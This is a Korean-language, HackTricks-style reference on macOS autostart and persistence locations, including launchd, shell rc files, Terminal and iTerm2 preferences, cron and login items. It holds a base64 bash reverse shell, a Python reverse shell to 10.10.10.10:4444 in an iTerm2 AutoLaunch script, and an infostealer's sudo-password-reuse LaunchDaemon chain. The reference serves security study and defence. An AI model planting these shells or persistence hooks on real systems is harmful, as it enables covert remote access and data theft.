# macOS 자동 시작

{{#include ../banners/hacktricks-training.md}}

이 섹션은 [**Beyond the good ol’ LaunchAgents**](https://theevilbit.github.io/beyond/) 블로그 시리즈를 기반으로 작성되었으며, 목표는 **더 많은 자동 시작 위치**를 추가하고(가능한 경우), 최신 macOS 버전(13.4)에서 **어떤 기법이 여전히 작동하는지** 나타내며, 필요한 **권한**을 명시하는 것입니다.

## Sandbox 우회

> [!TIP]
> 여기에서는 **Sandbox 우회**에 유용한 시작 위치를 확인할 수 있습니다. 이러한 위치를 사용하면 **파일에 무언가를 작성**한 후 매우 **일반적인** **동작**, 정해진 **시간** 또는 일반적으로 Sandbox 내부에서 수행할 수 있는 **동작**을 기다리는 것만으로 무언가를 실행할 수 있으며, root 권한이 필요하지 않습니다.

### Launchd

- Sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`/Library/LaunchAgents`**
- **Trigger**: 재부팅
- root 필요
- **`/Library/LaunchDaemons`**
- **Trigger**: 재부팅
- root 필요
- **`/System/Library/LaunchAgents`**
- **Trigger**: 재부팅
- root 필요
- **`/System/Library/LaunchDaemons`**
- **Trigger**: 재부팅
- root 필요
- **`~/Library/LaunchAgents`**
- **Trigger**: 다시 로그인
- **`~/Library/LaunchDemons`**
- **Trigger**: 다시 로그인

> [!TIP]
> 흥미로운 사실로, **`launchd`**에는 Mach-o 섹션 `__Text.__config`에 내장된 property list가 있으며, 여기에는 launchd가 시작해야 하는 잘 알려진 다른 서비스가 포함되어 있습니다. 또한 이러한 서비스에는 `RequireSuccess`, `RequireRun` 및 `RebootOnSuccess`가 포함될 수 있으며, 이는 해당 서비스가 실행되고 성공적으로 완료되어야 함을 의미합니다.
>
> 물론 code signing 때문에 수정할 수 없습니다.

#### 설명 및 Exploitation

**`launchd`**는 시작 시 OX S 커널이 실행하는 **첫 번째** **process**이며, 종료 시 마지막으로 완료되는 process입니다. 항상 **PID 1**이어야 합니다. 이 process는 다음 위치의 **ASEP** **plists**에 지정된 구성을 **읽고 실행**합니다.

- `/Library/LaunchAgents`: 관리자가 설치한 사용자별 agents
- `/Library/LaunchDaemons`: 관리자가 설치한 시스템 전체 daemons
- `/System/Library/LaunchAgents`: Apple이 제공하는 사용자별 agents
- `/System/Library/LaunchDaemons`: Apple이 제공하는 시스템 전체 daemons

사용자가 로그인하면 `/Users/$USER/Library/LaunchAgents` 및 `/Users/$USER/Library/LaunchDemons`에 있는 plists가 **로그인한 사용자의 권한**으로 시작됩니다.

**agents와 daemons의 주요 차이점은 agents가 사용자가 로그인할 때 로드되고 daemons는 시스템 시작 시 로드된다는 것입니다**(ssh와 같이 사용자가 시스템에 액세스하기 전에 실행되어야 하는 서비스가 있기 때문입니다). 또한 agents는 GUI를 사용할 수 있지만 daemons는 백그라운드에서 실행되어야 합니다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**사용자가 로그인하기 전에 agent를 실행해야 하는 경우**가 있으며, 이를 **PreLoginAgents**라고 합니다. 예를 들어 로그인 시 보조 기술을 제공하는 데 유용합니다. 이러한 agent는 `/Library/LaunchAgents`에서도 찾을 수 있습니다([**여기**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)에 예제가 있습니다).

> [!TIP]
> 새로운 Daemons 또는 Agents config 파일은 **다음 재부팅 후 또는 다음 명령을 사용하면 로드됩니다**: `launchctl load <target.plist>` 확장자가 없는 .plist 파일도 `launchctl -F <file>`을 사용하여 로드할 수 있습니다(단, 이러한 plist 파일은 재부팅 후 자동으로 로드되지 않습니다).\
> `launchctl unload <target.plist>`를 사용하여 **unload**할 수도 있습니다(해당 파일이 가리키는 process가 종료됩니다).
>
> **Agent** 또는 **Daemon**이 **실행되는 것을 방해하는** **어떠한 항목도**(예: override) **없도록 하려면**, 다음을 실행합니다: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

현재 user가 로드한 모든 agents 및 daemons를 나열합니다:
```bash
launchctl list
```
#### 악성 LaunchDaemon chain 예시 (password reuse)

최근 macOS infostealer는 **captured sudo password**를 재사용해 user agent와 root LaunchDaemon을 설치했습니다:<sup>[[1]](#references)</sup>

- agent loop를 `~/.agent`에 작성하고 executable로 설정합니다.
- 해당 agent를 가리키는 plist를 `/tmp/starter`에 생성합니다.
- 탈취한 password를 `sudo -S`와 함께 재사용해 이를 `/Library/LaunchDaemons/com.finder.helper.plist`로 복사하고, `root:wheel`을 설정한 다음 `launchctl load`로 로드합니다.
- `nohup ~/.agent >/dev/null 2>&1 &`를 사용해 output을 detach하여 agent를 조용히 시작합니다.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plist가 사용자 소유인 경우, daemon 시스템 전체 폴더에 있더라도 **task는 root가 아닌 해당 사용자로 실행**됩니다. 이는 일부 privilege escalation 공격을 방지할 수 있습니다.

#### launchd에 대한 추가 정보

**`launchd`**는 **kernel**에서 시작되는 최초의 **user mode process**입니다. process 시작은 **성공해야 하며**, **종료되거나 crash할 수 없습니다**. 일부 **killing signal**에 대해서도 **보호**됩니다.

`launchd`가 수행하는 첫 번째 작업 중 하나는 다음과 같은 모든 **daemon**을 **시작**하는 것입니다.

- **실행 시각을 기준으로 하는 Timer daemon:**
- atd (`com.apple.atrun.plist`): 30분의 `StartInterval`을 가집니다.
- crond (`com.apple.systemstats.daily.plist`): 00:15에 시작하도록 `StartCalendarInterval`을 가집니다.
- **Network daemon:**
- `org.cups.cups-lpd`: TCP (`SockType: stream`)에서 `printer`라는 `SockServiceName`으로 listen합니다.
- SockServiceName은 port이거나 `/etc/services`에 있는 service여야 합니다.
- `com.apple.xscertd.plist`: TCP port 1640에서 listen합니다.
- **지정된 path가 변경될 때 실행되는 Path daemon:**
- `com.apple.postfix.master`: `/etc/postfix/aliases` path를 확인합니다.
- **IOKit notifications daemon:**
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` entry에서 `com.apple.xscertd.helper`라는 이름을 나타냅니다.
- **UserEventAgent:**
- 이는 앞의 항목과 다릅니다. 특정 event에 응답하여 launchd가 app을 spawn하도록 합니다. 그러나 이 경우 관련된 main binary는 `launchd`가 아니라 `/usr/libexec/UserEventAgent`입니다. 이 binary는 SIP restricted folder인 `/System/Library/UserEventPlugins/`에서 plugin을 load하며, 각 plugin은 `XPCEventModuleInitializer` key에 initialiser를 표시합니다. 또는 오래된 plugin의 경우 해당 plugin의 `Info.plist`에 있는 `CFPluginFactories` dict에서 `FB86416D-6164-2070-726F-70735C216EC0` key 아래에 표시합니다.

### shell startup file

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- 하지만 이러한 file을 load하는 shell을 실행하는 TCC bypass app을 찾아야 합니다.

#### 위치

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh로 terminal을 엽니다.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh로 terminal을 엽니다.
- root 필요
- **`~/.zlogout`**
- **Trigger**: zsh로 terminal을 종료합니다.
- **`/etc/zlogout`**
- **Trigger**: zsh로 terminal을 종료합니다.
- root 필요
- 더 많은 항목이 있을 수 있음: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash로 terminal을 엽니다.
- `/etc/profile` (작동하지 않음)
- `~/.profile` (작동하지 않음)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm에서 trigger될 것으로 예상되지만, **설치되어 있지 않으며** 설치한 후에도 다음 error가 발생합니다: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### 설명 및 Exploitation

`zsh` 또는 `bash`와 같은 shell environment를 시작하면 **특정 startup file이 실행**됩니다. macOS는 현재 `/bin/zsh`를 default shell로 사용합니다. 이 shell은 Terminal app이 실행되거나 SSH를 통해 device에 access할 때 자동으로 access됩니다. macOS에는 `bash`와 `sh`도 있지만, 사용하려면 명시적으로 invoke해야 합니다.<sup>[[2]](#references)</sup>

**`man zsh`**로 읽을 수 있는 zsh의 man page에는 startup file에 대한 긴 설명이 있습니다.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 다시 열리는 Applications

> [!CAUTION]
> 지정된 exploitation을 구성하고 로그아웃한 후 다시 로그인하거나, 심지어 재부팅해도 testing에서 app이 실행되지 않았습니다. 이러한 작업을 수행할 때 app이 실행 중이어야 할 수 있습니다.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: 재시작 시 applications 다시 열기

#### 설명 및 Exploitation

다시 열 applications은 모두 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup> 안에 있습니다.

따라서 다시 열 applications이 자신의 app을 실행하도록 하려면 **app을 목록에 추가**하기만 하면 됩니다.

UUID는 해당 directory를 나열하거나 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`를 사용하여 확인할 수 있습니다.

다시 열릴 applications을 확인하려면 다음을 실행합니다:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**이 목록에 애플리케이션을 추가하려면** 다음을 사용할 수 있습니다:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal 환경설정

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal은 이를 사용하는 사용자의 FDA permissions를 갖게 됨

#### 위치

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal 열기

#### 설명 및 Exploitation

**`~/Library/Preferences`**에는 Applications에서 사용되는 사용자의 환경설정이 저장됩니다. 이러한 환경설정 중 일부에는 **다른 applications/scripts를 execute**하기 위한 configuration이 포함될 수 있습니다.<sup>[[5]](#references)</sup>

예를 들어, Terminal은 Startup 시 command를 execute할 수 있습니다:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

이 config는 **`~/Library/Preferences/com.apple.Terminal.plist`** 파일에 다음과 같이 반영됩니다:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
따라서 시스템에서 Terminal 환경설정의 plist를 덮어쓸 수 있다면 **`open`** 기능을 사용하여 **Terminal을 열고 해당 명령을 실행**할 수 있습니다.

다음 명령을 사용하여 CLI에서 이를 추가할 수 있습니다:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / 기타 파일 확장자

- Sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 사용자가 Terminal을 사용하면 해당 사용자의 FDA permissions을 가짐

#### Location

- **어디서나**
- **Trigger**: Terminal 열기

#### Description & Exploitation

[**`.terminal` 스크립트](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)를 생성하고 열면, **Terminal application**이 자동으로 실행되어 해당 파일에 지정된 commands를 실행합니다. Terminal app에 특별한 privileges(예: TCC)가 있다면, 사용자의 command는 해당 특별한 privileges로 실행됩니다.

다음과 같이 시도합니다:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
또한 일반적인 shell scripts 내용이 포함된 **`.command`**, **`.tool`** 확장자를 사용할 수도 있으며, 이 파일들도 Terminal에서 열립니다.

> [!CAUTION]
> Terminal에 **Full Disk Access**가 있으면 해당 작업을 완료할 수 있습니다(실행된 command는 Terminal window에 표시된다는 점에 유의).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 추가 TCC access를 얻을 수도 있음

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Root 권한 필요
- **Trigger**: coreaudiod 또는 computer 재시작
- **`/Library/Audio/Plug-ins/Components`**
- Root 권한 필요
- **Trigger**: coreaudiod 또는 computer 재시작
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod 또는 computer 재시작
- **`/System/Library/Components`**
- Root 권한 필요
- **Trigger**: coreaudiod 또는 computer 재시작

#### Description

이전 writeup에 따르면 일부 audio plugins을 **compile**하여 로드할 수 있습니다.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 추가 TCC access를 얻을 수도 있음

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins은 **파일 미리보기를 trigger**하고(Finder에서 파일을 선택한 상태로 space bar를 누름), 해당 파일 유형을 지원하는 **plugin이 설치되어 있을 때** 실행될 수 있습니다.<sup>[[8]](#references)</sup>

직접 QuickLook plugin을 compile하여 이전 위치 중 하나에 배치하고 로드한 다음, 지원되는 파일로 이동하여 space를 눌러 trigger할 수 있습니다.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> 사용자 LoginHook을 사용할 때도, root LogoutHook을 사용할 때도 저에게는 작동하지 않았습니다.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`와 같은 것을 execute할 수 있어야 합니다.
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

이 기능들은 deprecated되었지만, 사용자가 login할 때 command를 execute하는 데 사용할 수 있습니다.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
이 설정은 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`에 저장됩니다.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
삭제하려면:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root user의 항목은 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**에 저장됩니다.

## Conditional Sandbox Bypass

> [!TIP]
> 여기에서는 **sandbox bypass**에 유용한 start location을 확인할 수 있습니다. 이를 통해 파일에 무언가를 **작성**하고 특정 **프로그램이 설치되어 있거나, "흔하지 않은" 사용자 작업 또는 환경**과 같은 일반적이지 않은 조건을 예상하는 것만으로 무언가를 간단히 실행할 수 있습니다.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass에 유용: [✅](https://emojipedia.org/check-mark-button)
- 그러나 `crontab` binary를 execute할 수 있어야 합니다.
- 또는 root여야 합니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 직접 write access하려면 root가 필요합니다. `crontab <file>`을 execute할 수 있다면 root가 필요하지 않습니다.
- **Trigger**: cron job에 따라 다릅니다.

#### Description & Exploitation

다음 명령으로 **현재 사용자의** cron job을 나열합니다:
```bash
crontab -l
```
사용자의 모든 cron jobs는 **`/usr/lib/cron/tabs/`** 및 **`/var/at/tabs/`**에서도 확인할 수 있습니다(root 필요).

MacOS에서는 **특정 주기**로 scripts를 실행하는 여러 폴더를 다음 위치에서 찾을 수 있습니다:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
여기에서 일반적인 **cron** **jobs**, **at** **jobs**(많이 사용되지는 않음), 그리고 **periodic** **jobs**(주로 임시 파일 정리에 사용됨)를 확인할 수 있습니다. 예를 들어 daily periodic jobs는 다음과 같이 실행할 수 있습니다: `periodic daily`.<sup>[[10]](#references)</sup>

**user cronjob**을 프로그래밍 방식으로 추가하려면 다음을 사용할 수 있습니다:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

작성 글: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2에는 TCC permissions가 부여되어 있었음

#### 위치

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: iTerm 열기
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: iTerm 열기
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: iTerm 열기

#### 설명 및 Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**에 저장된 Scripts가 실행됩니다. 예를 들어:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
또는:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
스크립트 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**도 실행됩니다:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`**에 있는 iTerm2 환경설정은 iTerm2 터미널이 열릴 때 **실행할 command를 지정할 수 있습니다**.

이 설정은 iTerm2 설정에서 구성할 수 있습니다:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

그리고 해당 command는 환경설정에 반영됩니다:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
다음과 같이 실행할 명령을 설정할 수 있습니다:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**를 악용하여 arbitrary commands를 실행하는 다른 방법이 있을 가능성이 매우 높습니다.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 xbar가 설치되어 있어야 함
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissions를 요청함

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbar가 실행될 때 한 번

#### Description

인기 프로그램인 [**xbar**](https://github.com/matryer/xbar)가 설치되어 있다면 **`~/Library/Application\ Support/xbar/plugins/`**에 shell script를 작성할 수 있으며, 이 script는 xbar가 시작될 때 실행됩니다:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**작성 문서**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 Hammerspoon이 설치되어 있어야 함
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility 권한을 요청함

#### 위치

- **`~/.hammerspoon/init.lua`**
- **트리거**: hammerspoon이 실행되면 한 번

#### 설명

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)은 **LUA scripting language**를 활용하여 **macOS**의 자동화 플랫폼으로 작동합니다. 특히 완전한 AppleScript 코드의 통합과 shell scripts의 실행을 지원하여 scripting 기능을 크게 향상합니다.<sup>[[13]](#references)</sup>

앱은 `~/.hammerspoon/init.lua` 파일 하나를 찾으며, 시작되면 해당 script가 실행됩니다.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 BetterTouchTool이 설치되어 있어야 함
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts 및 Accessibility 권한을 요청함

#### 위치

- `~/Library/Application Support/BetterTouchTool/*`

이 tool을 사용하면 특정 shortcut이 눌렸을 때 실행할 applications 또는 scripts를 지정할 수 있습니다. 공격자는 **database에서 실행할 자체 shortcut 및 action을 구성**하여 임의의 code가 실행되도록 할 수 있습니다(shortcut은 단순히 키를 누르는 것일 수 있음).

### Alfred

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 Alfred가 설치되어 있어야 함
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation, Accessibility, 심지어 Full-Disk access 권한도 요청함

#### 위치

- `???`

특정 조건이 충족되었을 때 code를 실행할 수 있는 workflows를 생성할 수 있습니다. 공격자가 workflow file을 생성하고 Alfred가 이를 load하도록 만들 수 있을 가능성이 있습니다(workflows를 사용하려면 premium version을 구매해야 함).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 ssh가 enabled 상태이고 사용되어야 함
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH는 FDA access를 사용함

#### 위치

- **`~/.ssh/rc`**
- **Trigger**: ssh를 통한 Login
- **`/etc/ssh/sshrc`**
- Root 필요
- **Trigger**: ssh를 통한 Login

> [!CAUTION]
> ssh를 켜려면 Full Disk Access가 필요합니다:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 설명 및 Exploitation

기본적으로 `/etc/ssh/sshd_config`에 `PermitUserRC no`가 설정되어 있지 않으면, 사용자가 **SSH를 통해 Login**할 때 **`/etc/ssh/sshrc`** 및 **`~/.ssh/rc`** scripts가 실행됩니다.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 args와 함께 `osascript`를 실행해야 함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- `osascript`를 호출하여 저장된 Exploit payload 실행
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root 필요

#### 설명

System Preferences -> Users & Groups -> **Login Items**에서 **사용자가 로그인할 때 실행될 items**를 찾을 수 있습니다.\
command line에서 이를 나열하고, 추가하고, 제거할 수 있습니다:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
이 항목들은 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** 파일에 저장됩니다.

**Login items**는 API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc)를 사용해 **추가로** 지정할 수도 있으며, 이 경우 설정은 **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**에 저장됩니다.

### ZIP as Login Item

(Login Items에 관한 이전 섹션을 확인하세요. 이 내용은 해당 섹션의 확장입니다.)

